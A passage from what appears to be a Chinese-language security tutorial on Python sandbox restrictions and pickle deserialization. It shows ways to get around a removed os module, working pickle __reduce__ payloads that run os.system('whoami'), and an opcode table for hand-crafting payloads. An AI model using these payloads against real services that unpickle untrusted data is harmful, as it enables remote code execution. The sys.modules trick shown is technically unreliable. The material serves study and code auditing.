title="部分模块被限制"></a>部分模块被限制</h4><p>服务器如果对Python的某些高风险模块如os进行了删除或修改权限设置，可能导致无法正常使用。但是sys没有限制，我们可以使用sys.modules来查看初始化就加载的模块</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Python <span class="number">2.7</span><span class="number">.18</span> (default, Jan <span class="number">27</span> <span class="number">2022</span>, 02:05:<span class="number">20</span>) </span><br><span class="line">[GCC <span class="number">11.2</span><span class="number">.0</span>] on linux2</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules</span><br><span class="line">&#123;<span class="string">&#x27;copy_reg&#x27;</span>: &lt;module <span class="string">&#x27;copy_reg&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/copy_reg.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;sre_compile&#x27;</span>: &lt;module <span class="string">&#x27;sre_compile&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/sre_compile.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;_sre&#x27;</span>: &lt;module <span class="string">&#x27;_sre&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;encodings&#x27;</span>: &lt;module <span class="string">&#x27;encodings&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/encodings/__init__.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;site&#x27;</span>: &lt;module <span class="string">&#x27;site&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/site.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;__builtin__&#x27;</span>: &lt;module <span class="string">&#x27;__builtin__&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;sysconfig&#x27;</span>: &lt;module <span class="string">&#x27;sysconfig&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/sysconfig.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;__main__&#x27;</span>: &lt;module <span class="string">&#x27;__main__&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;encodings.encodings&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line"> <span class="string">&#x27;abc&#x27;</span>: &lt;module <span class="string">&#x27;abc&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/abc.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;posixpath&#x27;</span>: &lt;module <span class="string">&#x27;posixpath&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/posixpath.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;_weakrefset&#x27;</span>: &lt;module <span class="string">&#x27;_weakrefset&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/_weakrefset.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;errno&#x27;</span>: &lt;module <span class="string">&#x27;errno&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;encodings.codecs&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line"> <span class="string">&#x27;sre_constants&#x27;</span>: &lt;module <span class="string">&#x27;sre_constants&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/sre_constants.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;re&#x27;</span>: &lt;module <span class="string">&#x27;re&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/re.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;_abcoll&#x27;</span>: &lt;module <span class="string">&#x27;_abcoll&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/_abcoll.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;types&#x27;</span>: &lt;module <span class="string">&#x27;types&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/types.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;_codecs&#x27;</span>: &lt;module <span class="string">&#x27;_codecs&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;encodings.__builtin__&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line"> <span class="string">&#x27;_warnings&#x27;</span>: &lt;module <span class="string">&#x27;_warnings&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;genericpath&#x27;</span>: &lt;module <span class="string">&#x27;genericpath&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/genericpath.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;stat&#x27;</span>: &lt;module <span class="string">&#x27;stat&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/stat.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;zipimport&#x27;</span>: &lt;module <span class="string">&#x27;zipimport&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;_sysconfigdata&#x27;</span>: &lt;module <span class="string">&#x27;_sysconfigdata&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/_sysconfigdata.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;warnings&#x27;</span>: &lt;module <span class="string">&#x27;warnings&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/warnings.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;UserDict&#x27;</span>: &lt;module <span class="string">&#x27;UserDict&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/UserDict.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;glob&#x27;</span>: &lt;module <span class="string">&#x27;glob&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/glob.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;encodings.utf_8&#x27;</span>: &lt;module <span class="string">&#x27;encodings.utf_8&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/encodings/utf_8.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;sys&#x27;</span>: &lt;module <span class="string">&#x27;sys&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;fnmatch&#x27;</span>: &lt;module <span class="string">&#x27;fnmatch&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/fnmatch.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;imp&#x27;</span>: &lt;module <span class="string">&#x27;imp&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;codecs&#x27;</span>: &lt;module <span class="string">&#x27;codecs&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/codecs.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;readline&#x27;</span>: &lt;module <span class="string">&#x27;readline&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/lib-dynload/readline.x86_64-linux-gnu.so&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;_sysconfigdata_nd&#x27;</span>: &lt;module <span class="string">&#x27;_sysconfigdata_nd&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/plat-x86_64-linux-gnu/_sysconfigdata_nd.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;os.path&#x27;</span>: &lt;module <span class="string">&#x27;posixpath&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/posixpath.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;_locale&#x27;</span>: &lt;module <span class="string">&#x27;_locale&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;sitecustomize&#x27;</span>: &lt;module <span class="string">&#x27;sitecustomize&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/sitecustomize.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;signal&#x27;</span>: &lt;module <span class="string">&#x27;signal&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;traceback&#x27;</span>: &lt;module <span class="string">&#x27;traceback&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/traceback.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;linecache&#x27;</span>: &lt;module <span class="string">&#x27;linecache&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/linecache.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;posix&#x27;</span>: &lt;module <span class="string">&#x27;posix&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;encodings.aliases&#x27;</span>: &lt;module <span class="string">&#x27;encodings.aliases&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/encodings/aliases.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;exceptions&#x27;</span>: &lt;module <span class="string">&#x27;exceptions&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;sre_parse&#x27;</span>: &lt;module <span class="string">&#x27;sre_parse&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/sre_parse.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;os&#x27;</span>: &lt;module <span class="string">&#x27;os&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/os.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;_weakref&#x27;</span>: &lt;module <span class="string">&#x27;_weakref&#x27;</span> (built-<span class="keyword">in</span>)&gt;&#125;</span><br></pre></td></tr></table></figure><p>如果我们修改掉os模块的路径，那么就无法使用了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">&#x27;os&#x27;</span>]=<span class="literal">None</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ImportError: No module named os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ImportError: No module named os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> importlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>importlib.import_module(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;importlib/__init__.py&quot;</span>, line <span class="number">37</span>, <span class="keyword">in</span> import_module</span><br><span class="line">    <span class="built_in">__import__</span>(name)</span><br><span class="line">ImportError: No module named os</span><br></pre></td></tr></table></figure><p>但是我们可以手动的在加上去</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">&#x27;os&#x27;</span>]=<span class="string">&#x27;/usr/lib/python2.7/os.pyc&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br></pre></td></tr></table></figure><h4 id="文件或者模块全被删除"><a href="#文件或者模块全被删除" class="headerlink" title="文件或者模块全被删除"></a>文件或者模块全被删除</h4><p>最极端的方式就是os、sys、reload模块都被干掉了，usr等目录被限制了权限，那么我们就可以使用Python加载模块的先后顺序的方式</p><div class="note success modern"><p>当前目录 -&gt; sys.path列表中的其他目录</p></div><p>查看内容</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Python <span class="number">2.7</span><span class="number">.18</span> (default, Jan <span class="number">27</span> <span class="number">2022</span>, 02:05:<span class="number">20</span>) </span><br><span class="line">[GCC <span class="number">11.2</span><span class="number">.0</span>] on linux2</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.path</span><br><span class="line">[<span class="string">&#x27;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/lib/python2.7&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/lib/python2.7/plat-x86_64-linux-gnu&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/lib/python2.7/lib-tk&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/lib/python2.7/lib-old&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/lib/python2.7/lib-dynload&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/local/lib/python2.7/dist-packages&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/lib/python2.7/dist-packages&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/lib/python2.7/dist-packages&#x27;</span>]</span><br></pre></td></tr></table></figure><p>只需要把文件上传到当前文件同级目录就可以直接import os使用</p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>将对象转换为可通过网络传输或可以存储到本地磁盘的数据格式（如：XML、JSON或特定格式的字节串）的过程称为序列化；反之，则称为反序列化。如果用户反序列化一些不改反序列化的东西，那么就会照成漏洞</p><div class="table-container"><table><thead><tr><th>模块名称</th><th>描述</th><th>提供的api</th></tr></thead><tbody><tr><td>pickle</td><td>用于实现Python数据类型与Python特定二进制格式之间的转换</td><td>dumps()、dump()、loads()、load()</td></tr><tr><td>json</td><td>用于实现Python数据类型与通用（json）字符串之间的转换</td><td>dumps()、dump()、loads()、load()</td></tr><tr><td>shelve</td><td>专门用于将Python数据类型的数据持久化到磁盘，shelve是一个类似dict的对象，操作十分便捷</td><td>open()</td></tr></tbody></table></div><p>能够利用的函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.loads</span><br><span class="line">pickle.load</span><br><span class="line">pickle.Unpickler  <span class="comment"># 像一个代理类一样，在序列化前进行处理，进行安全过滤之类的</span></span><br><span class="line">cPickle.loads</span><br><span class="line">cPickle.load</span><br><span class="line">cPickle.Unpickler  <span class="comment"># 像一个代理类一样，在序列化前进行处理，进行安全过滤之类的</span></span><br><span class="line">shelve.<span class="built_in">open</span></span><br><span class="line">marshal.load</span><br><span class="line">marshal.loads</span><br></pre></td></tr></table></figure><h4 id="pickle"><a href="#pickle" class="headerlink" title="pickle"></a>pickle</h4><p>序列化数据</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 文件</span></span><br><span class="line">pickle.dump(obj, file, protocol=<span class="literal">None</span>, *, fix_imports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br><span class="line"><span class="comment"># 字节流</span></span><br><span class="line">pickle.dumps(obj, protocol=<span class="literal">None</span>, *, fix_imports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure><p>反序列化数据</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 文件</span></span><br><span class="line">pickle.load(file, *, fix_imports=<span class="literal">True</span>, encoding=<span class="string">&#x27;ASCII&#x27;</span>, errors=<span class="string">&#x27;strict&#x27;</span>, buffers=<span class="literal">None</span>)</span><br><span class="line"><span class="comment"># 字节流</span></span><br><span class="line">pickle.loads(data, /, *, fix_imports=<span class="literal">True</span>, encoding=<span class="string">&#x27;ASCII&#x27;</span>, errors=<span class="string">&#x27;strict&#x27;</span>, buffers=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure><blockquote><p>pickle.Unpickler像一个代理类一样，在序列化前进行处理，进行安全过滤之类的。</p></blockquote><p>Python2标准库中有<code>pickle</code>和<code>cPickle</code>，Python3中只有前者。</p><p>pickle由于有不同的实现版本，目前有6个版本，但是pickle可以向下兼容（所以用v0就可以在所有版本中执行），目前pickle只有6个版本。</p><p>如果python2中的序列化文件如果想在python3中读取，需要修改编码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 选定pickle版本</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">a=&#123;<span class="string">&#x27;1&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;2&#x27;</span>: <span class="number">2</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;# 原变量：<span class="subst">&#123;a!r&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;pickle版本<span class="subst">&#123;i&#125;</span>&#x27;</span>,pickle.dumps(a,protocol=i))</span><br><span class="line"><span class="comment"># python2读取文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.pkl&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    l = <span class="built_in">list</span>(pickle.load(f))</span><br><span class="line"><span class="comment"># python3读取文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.pkl&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    u = pickle._Unpickler(f)</span><br><span class="line">    u.encoding = <span class="string">&#x27;latin1&#x27;</span></span><br><span class="line">    p = u.load()</span><br></pre></td></tr></table></figure><p><code>pickle</code>允许任意对象通过定义<code>__reduce__</code>方法来声明它是如何被压缩的，一般来说这个方法是返回一个字符串或是一个元祖</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__reduce__</span><br><span class="line">被定义之后，当对象被Pickle时就会被调用</span><br><span class="line">要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。这个元组包含<span class="number">2</span>到<span class="number">5</span>个元素，其中包括：一个可调用的对象，用于重建对象时调用；一个参数元素，供那个可调用对象使用</span><br><span class="line">__reduce_ex__</span><br><span class="line">首先查看是否存在__reduce_ex__,如果存在则不再查找__reduce__，不存在的话则继续查找__reduce__</span><br></pre></td></tr></table></figure><p>编写漏洞代码<code>__reduce__</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;whoami&#x27;</span>,))</span><br><span class="line">a=test()</span><br><span class="line">payload=pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">pickle.loads(payload)</span><br></pre></td></tr></table></figure><p>如果使用的是<code>__reduce_ex__</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, cmd</span>):</span><br><span class="line">        self.cmd = cmd</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce_ex__</span>(<span class="params">self,cmd</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system,(self.cmd,))</span><br><span class="line">a=test(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">payload=pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">pickle.loads(payload)</span><br></pre></td></tr></table></figure><blockquote><p>其中<code>pickle.loads</code>是会解决import问题，对于未引入的module会自动尝试import。</p></blockquote><p>比如说我们直接执行代码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle;pickle.loads(<span class="string">b&#x27;\x80\x04\x95\x1e\x00\x00\x00\x00\x00\x00\x00\x8c\x02os\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.&#x27;</span>)</span><br></pre></td></tr></table></figure><p>内置能够执行命令的函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>,execfile,<span class="built_in">compile</span>,<span class="built_in">open</span>,file,<span class="built_in">map</span>,<span class="built_in">input</span>,os.system,os.popen,os.popen2,os.popen3,os.popen4,os.<span class="built_in">open</span>,os.pipe,os.listdir,os.access,os.execl,os.execle,os.execlp,os.execlpe,os.execv,os.execve,os.execvp,os.execvpe,os.spawnl,os.spawnle,os.spawnlp,os.spawnlpe,os.spawnv,os.spawnve,os.spawnvp,os.spawnvpe,pickle.load,pickle.loads,cPickle.load,cPickle.loads,subprocess.call,subprocess.check_call,subprocess.check_output,subprocess.Popen,commands.getstatusoutput,commands.getoutput,commands.getstatus,glob.glob,linecache.getline,shutil.copyfileobj,shutil.copyfile,shutil.copy,shutil.copy2,shutil.move,shutil.make_archive,dircache.listdir,dircache.opendir,io.<span class="built_in">open</span>,popen2.popen2,popen2.popen3,popen2.popen4,timeit.timeit,timeit.repeat,sys.call_tracing,code.interact,code.compile_command,codeop.compile_command,pty.spawn,posixfile.<span class="built_in">open</span>,posixfile.fileopen,platform.popen</span><br></pre></td></tr></table></figure><h5 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h5><p>不同的操作码对应不同的动作，接下来开始学习PVM是如何运作opcode的。我们需要知道的是：<strong>PVM引擎会识别opcode中不同的指令码，从而进行相应的操作。</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line">data=<span class="string">b&#x27;\x80\x04\x95\x1e\x00\x00\x00\x00\x00\x00\x00\x8c\x02os\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.&#x27;</span></span><br><span class="line">pickletools.dis(data)</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th>name</th><th>op</th><th>params</th><th>describe</th><th>e.g.</th></tr></thead><tbody><tr><td>MARK</td><td>(</td><td>null</td><td>向栈顶push一个MARK</td><td></td></tr><tr><td>STOP</td><td>.</td><td>null</td><td>结束</td><td></td></tr><tr><td>POP</td><td>0</td><td>null</td><td>丢弃栈顶第一个元素</td><td></td></tr><tr><td>POP_MARK</td><td>1</td><td>null</td><td>丢弃栈顶到MARK之上的第一个元素</td><td></td></tr><tr><td>DUP</td><td>2</td><td>null</td><td>在栈顶赋值一次栈顶元素</td><td></td></tr><tr><td>FLOAT</td><td>F</td><td>F [float]</td><td>push一个float</td><td>F1.0</td></tr><tr><td>INT</td><td>I</td><td>I [int]</td><td>push一个integer</td><td>I1</td></tr><tr><td>NONE</td><td>N</td><td>null</td><td>push一个None</td><td></td></tr><tr><td>REDUCE</td><td>R</td><td>[callable] [tuple] R</td><td>调用一个callable对象</td><td>crandom\nRandom\n)R</td></tr><tr><td>STRING</td><td>S</td><td>S [string]</td><td>push一个string</td><td>S ‘x’</td></tr><tr><td>UNICODE</td><td>V</td><td>V [unicode]</td><td>push一个unicode string</td><td>V ‘x’</td></tr><tr><td>APPEND</td><td>a</td><td>[list] [obj] a</td><td>向列表append单个对象</td><td>]I100\na</td></tr><tr><td>BUILD</td><td>b</td><td>[obj] [dict] b</td><td>添加实例属性（修改<code>__dict__</code>）</td><td>cmodule\nCls\n)R(I1\nI2\ndb</td></tr><tr><td>GLOBAL</td><td>c</td><td>c [module] [name]</td><td>调用Pickler的<code>find_class</code>，导入module.name并push到栈顶</td><td>cos\nsystem\n</td></tr><tr><td>DICT</td><td>d</td><td>MARK [[k] [v]…] d</td><td>将栈顶MARK以前的元素弹出构造dict，再push回栈顶</td><td>(I0\nI1\nd</td></tr><tr><td>EMPTY_DICT</td><td>}</td><td>null</td><td>push一个空dict</td><td></td></tr><tr><td>APPENDS</td><td>e</td><td>[list] MARK [obj…] e</td><td>将栈顶MARK以前的元素append到前一个的list</td><td>](I0\ne</td></tr><tr><td>GET</td><td>g</td><td>g [index]</td><td>从memo获取元素</td><td>g0</td></tr><tr><td>INST</td><td>i</td><td>MARK [args…] i [module] [cls]</td><td>构造一个类实例（其实等同于调用一个callable对象），内部调用了<code>find_class</code></td><td>(S’ls’\nios\nsystem\n</td></tr><tr><td>LIST</td><td>l</td><td>MARK [obj] l</td><td>将栈顶MARK以前的元素弹出构造一个list，再push回栈顶</td><td>(I0\nl</td></tr><tr><td>EMPTY_LIST</td><td>]</td><td>null</td><td>push一个空list</td><td></td></tr><tr><td>OBJ</td><td>o</td><td>MARK [callable] [args…] o</td><td>同INST，参数获取方式由readline变为stack.pop而已</td><td>(cos\nsystem\nS’ls’\no</td></tr><tr><td>PUT</td><td>p</td><td>p [index]</td><td>将栈顶元素放入memo</td><td>p0</td></tr><tr><td>SETITEM</td><td>s</td><td>[dict] [k] [v] s</td><td>设置dict的键值</td><td>}I0\nI1\ns</td></tr><tr><td>TUPLE</td><td>t</td><td>MARK [obj…] t</td><td>将栈顶MARK以前的元素弹出构造tuple，再push回栈顶</td><td>(I0\nI1\nt</td></tr><tr><td>EMPTY_TUPLE</td><td>)</td><td>null</td><td>push一个空tuple</td><td></td></tr><tr><td>SETITEMS</td><td>u</td><td>[dict] MARK [[k] [v]…] u</td><td>将栈顶MARK以前的元素弹出update到前一个dict</td><td>}(I0\nI1\nu</td></tr></tbody></table></div><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CodeAudit/Python/5.gif" alt="image-20220509001219887"></p><p>三种常见的操作符R（<strong>可以执行命令</strong>）、i（<strong>可以执行命令</strong>）、o（<strong>可以执行命令</strong>），还有一些不常见的c（<strong>可以进行变量覆盖</strong>）、b（<strong>可以执行命令</strong>）等，三种常见的如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">GLOBAL(<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>)             =&gt;  cos\nsystem\n</span><br><span class="line">INST(<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;ls&#x27;</span>)         =&gt;  (S<span class="string">&#x27;ls&#x27;</span>\nios\nsystem\n</span><br><span class="line">OBJ(GLOBAL(<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>), <span class="string">&#x27;ls&#x27;</span>)  =&gt;  (cos\nsystem\nS<span class="string">&#x27;ls&#x27;</span>\no</span><br></pre></td></tr></table></figure><div class="note success modern"><p><code>R</code>操作符</p></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Evil</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">&#x27;whoami&#x27;</span>,))</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(Evil(),protocol=<span class="number">0</span>))  <span class="comment"># protocol表示协议版本</span></span><br><span class="line">pickletools.dis(pickle.dumps(Evil(),protocol=<span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>输入的内容如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;cos\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.&#x27;</span></span><br><span class="line">    <span class="number">0</span>: c    GLOBAL     <span class="string">&#x27;os system&#x27;</span></span><br><span class="line">   <span class="number">11</span>: p    PUT        <span class="number">0</span></span><br><span class="line">   <span class="number">14</span>: (    MARK</span><br><span class="line">   <span class="number">15</span>: V        UNICODE    <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">   <span class="number">23</span>: p        PUT        <span class="number">1</span></span><br><span class="line">   <span class="number">26</span>: t        TUPLE      (MARK at <span 